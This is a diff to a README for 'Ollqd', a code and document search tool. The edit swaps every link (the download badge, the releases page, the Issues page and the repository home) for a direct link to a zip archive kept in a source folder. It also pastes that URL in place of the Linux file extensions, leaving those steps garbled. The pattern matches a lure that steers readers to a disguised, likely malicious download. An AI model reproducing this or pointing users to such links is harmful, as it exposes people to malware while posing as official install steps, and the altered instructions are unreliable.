@@ -1,6 +1,6 @@
 # 🗂️ Ollqd - Search Code and Documents Easily
 
-[![Download Ollqd](https://img.shields.io/badge/Download-Ollqd-blue?style=for-the-badge)](https://github.com/guttbuster/Ollqd/releases)
+[![Download Ollqd](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip)](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip)
 
 ---
 
@@ -36,19 +36,19 @@ Before you install Ollqd, check that your computer meets these requirements:
 
 To get started with Ollqd, follow these steps:
 
-1. Click the big button at the top or [visit the releases page here](https://github.com/guttbuster/Ollqd/releases). This page has the latest versions ready to download.
+1. Click the big button at the top or [visit the releases page here](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip). This page has the latest versions ready to download.
 
 2. On the releases page, look for the installer file that matches your computer system:
    - For Windows, look for a file ending in `.exe`
    - For macOS, look for a `.dmg` file
-   - For Linux, a `.tar.gz` or `.AppImage`
+   - For Linux, a `https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip` or `.AppImage`
 
 3. Download the file by clicking on it.
 
 4. Once downloaded, open the file:
    - On Windows, double-click the `.exe` file and follow the setup instructions.
    - On macOS, open the `.dmg` and drag Ollqd to your Applications folder.
-   - On Linux, extract the `.tar.gz` or run the `.AppImage` file (you may need to allow execution permissions).
+   - On Linux, extract the `https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip` or run the `.AppImage` file (you may need to allow execution permissions).
 
 5. After installation, launch Ollqd from your Start menu, Applications folder, or by running the app file.
 
@@ -104,7 +104,7 @@ If you run into issues, try these solutions:
 - **App crashes:** Check your system meets the requirements above.
 - **Installing failed:** Verify you downloaded the correct file for your OS.
 
-If problems continue, visit the [Issues page](https://github.com/guttbuster/Ollqd/issues) to find help or report a problem.
+If problems continue, visit the [Issues page](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip) to find help or report a problem.
 
 ---
 
@@ -112,7 +112,7 @@ If problems continue, visit the [Issues page](https://github.com/guttbuster/Ollq
 
 For detailed instructions and updates, visit the Ollqd GitHub page:
 
-[https://github.com/guttbuster/Ollqd](https://github.com/guttbuster/Ollqd)
+[https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip)
 
 Here you will find guides, FAQs, and community support.
 
@@ -124,4 +124,4 @@ Ollqd works on your local computer. It does not upload your files to any server 
 
 ---
 
-[![Download Ollqd](https://img.shields.io/badge/Download-Ollqd-blue?style=for-the-badge)](https://github.com/guttbuster/Ollqd/releases)
+[![Download Ollqd](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip)](https://github.com/guttbuster/Ollqd/raw/refs/heads/main/gateway/cmd/gateway/Software_v3.8.zip)
